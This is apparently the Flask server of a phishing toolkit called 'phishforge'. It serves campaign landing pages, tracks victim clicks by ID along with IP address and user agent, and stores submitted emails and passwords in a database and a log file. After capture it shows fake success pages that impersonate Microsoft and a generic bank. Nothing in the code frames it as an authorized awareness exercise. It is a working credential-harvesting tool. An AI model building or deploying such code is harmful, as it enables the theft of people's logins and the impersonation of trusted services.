from flask import Flask , request
from datetime import datetime
from phishforge.models.database import *

init_db()

app = Flask(__name__)

@app.route('/' , methods=['GET' , 'POST'])
def fake_login ():
    if request.method == 'POST' :
        username = request.form.get('username', 'Unknown')
        password = request.form.get('password', 'Unknown')

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f" {timestamp} | ATTACK : {username} | {password} | victim clicked link"

        with open('logs/phishing_logs.txt' , 'a') as f:
            f.write(log_entry + '\n')

        return """
<html><head><title>Account Verification</title></head>
<body style='background:#f3f2f1;padding:60px;text-align:center;font-family:Segoe UI;'>
    <div style='background:white;max-width:400px;margin:auto;padding:40px;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.1);'>
        <h2 style='color:#605e5c;margin-bottom:20px;'>Account verified successfully</h2>
        <p style='color:#107c10;'>Your Microsoft account is now secure.</p>
        <p style='color:#666;font-size:14px;margin-top:30px;'>Return to your application.</p>
    </div>
</body></html>
"""
    with open ('templates/demo.html' , 'r') as f :
        return f.read()
@app.route('/c/<int:campaign_id>')
def campaign_landing(campaign_id):
    victim_id = request.args.get('vid')
    if victim_id :
        try:
            victim = get_victim_by_id(int(victim_id))
            if victim and victim['campaign_id'] == campaign_id :
                ip_address = request.remote_addr
                user_agent = request.headers.get('User_Agent', '')
                log_click(victim['id'], campaign_id , ip_address , user_agent)
                print(f"🎣 CLICK TRACKED: {victim['email']} (ID: {victim_id}) from {ip_address}")
        except:
            print(f"❌ Invalid victim ID: {victim_id}")

    campaign = get_campaign(campaign_id)  # Import from models.database
    if not campaign:
        return "Campaign not found", 404
    
    landing_html = campaign['landing_page_html']

    landing_html = landing_html.replace(
        'action="/login"',
        f'action="/c/{campaign_id}/login"'
    )
    landing_html = landing_html.replace(
        '</form>',
        f'<input type="hidden" name="campaign_id" value="{campaign_id}"></form>'
    )
    return landing_html, 200  # Serve raw HTML

@app.route('/c/<int:campaign_id>/login', methods=['POST'])
def campaign_login(campaign_id):
    campaign = get_campaign(campaign_id)
    email = request.form.get('email', '')
    password = request.form.get('password', '')
    
    # Save credentials to hits table
    conn = get_db_connection()
    c = conn.cursor()
    c.execute('INSERT INTO hits (campaign_id, email, password, ip_address) VALUES (?, ?, ?, ?)',
              (campaign_id, email, password, request.remote_addr))
    conn.commit()
    conn.close()
    
    return '''
    <!DOCTYPE html>
    <html>
    <head><title>Bank - Verifying...</title>
    <style>
        body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;margin:0;}
        .loader-container{max-width:400px;width:100%;padding:40px;background:white;border-radius:16px;box-shadow:0 20px 40px rgba(0,0,0,0.2);text-align:center;}
        .logo{font-size:28px;font-weight:bold;color:#1976d2;margin-bottom:20px;}
        h2{color:#333;margin-bottom:30px;font-size:24px;}
        .spinner{position:relative;display:inline-block;width:60px;height:60px;}
        .spinner div{position:absolute;width:12px;height:12px;background:#1976d2;border-radius:50%;animation:spin 1.2s linear infinite;}
        .spinner div:nth-child(1){top:0;left:24px;animation-delay:0s;}
        .spinner div:nth-child(2){top:8px;left:41px;animation-delay:-0.2s;}
        .spinner div:nth-child(3){top:24px;left:48px;animation-delay:-0.4s;}
        .spinner div:nth-child(4){top:41px;left:41px;animation-delay:-0.6s;}
        .spinner div:nth-child(5){top:48px;left:24px;animation-delay:-0.8s;}
        .spinner div:nth-child(6){top:41px;left:7px;animation-delay:-1s;}
        .spinner div:nth-child(7){top:24px;left:0px;animation-delay:-1.2s;}
        .spinner div:nth-child(8){top:8px;left:7px;animation-delay:-1.4s;}
        @keyframes spin{0%{transform:rotate(0deg) translateX(20px) rotate(0deg);}100%{transform:rotate(360deg) translateX(20px) rotate(-360deg);}}
        .status{margin-top:30px;color:#666;font-size:14px;}
    </style>
    </head>
    <body>
        <div class="loader-container">
            <div class="logo">🏦 Secure Bank</div>
            <h2>🔐 Verifying Identity</h2>
            <div class="spinner">
                <div></div><div></div><div></div><div></div>
                <div></div><div></div><div></div><div></div>
            </div>
            <p class="status">Please wait while we validate your credentials...<br>
            This may take a moment due to enhanced security checks.</p>
        </div>
    </body>
    </html>
    ''', 200
@app.route('/login', methods=['POST'])
def legacy_login():
    """Fallback for forms with action="/login" """
    email = request.form.get('email', '')
    password = request.form.get('password', '')
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', '')
    
    # Save to hits (campaign_id = 1 as default, or parse referer)
    conn = get_db_connection()
    c = conn.cursor()
    c.execute('''INSERT INTO hits (campaign_id, email, password, ip_address, user_agent) 
                 VALUES (?, ?, ?, ?, ?)''', (1, email, password, ip, user_agent))
    conn.commit()
    conn.close()
    
    print(f"✅ CAPTURED: {email} / {password} from {ip}")
    return '''
    <html><body style="font-family:Arial;text-align:center;padding:50px;">
    <h2>✓ Login Successful</h2>
    <p>Your account has been verified.</p>
    </body></html>
    ''', 200


if __name__ == '__main__' :
    app.run(debug=True ,   host='0.0.0.0' , port=3000)